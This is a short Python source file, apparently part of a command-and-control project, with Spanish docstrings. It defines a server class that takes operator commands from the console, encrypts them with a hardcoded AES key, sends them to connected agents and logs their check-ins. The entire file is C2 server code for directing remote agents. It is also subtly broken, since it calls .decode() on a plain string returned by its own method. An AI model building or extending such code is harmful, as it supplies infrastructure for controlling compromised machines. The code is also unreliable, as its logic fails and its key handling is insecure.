import sys
import os
import asyncio
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, project_root)
from crypto.aes_encryptor import AESEncryptor

class Crocodile:
    def __init__(self):
        key = b"thisis16byteskey"
        self.encryptor = AESEncryptor(key)
        self.sessions = {}

    async def start(self,reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Inicia el servidor y escucha check-ins de agentes."""
        while True:
            comand = input("Comando: ").encode("utf-8")
            encrypt = self.encryptor.encrypt(comand.decode())
            writer.write(encrypt)
            await writer.drain()
            print(f"Enviado: {encrypt}")
            
            res = await reader.read(4096)
            if res:
                decrypted_response = await self.encryptor.decrypt(res)
                agent_id, command = await self.process_check_in(decrypted_response)
                print(agent_id, command.decode())

    async def process_check_in(self, data: str) -> tuple:
        """Procesa el check-in de un agente."""
        agent_id, metadata = data.split("|")
        self.sessions[agent_id] = metadata
        return agent_id, "collect_info"
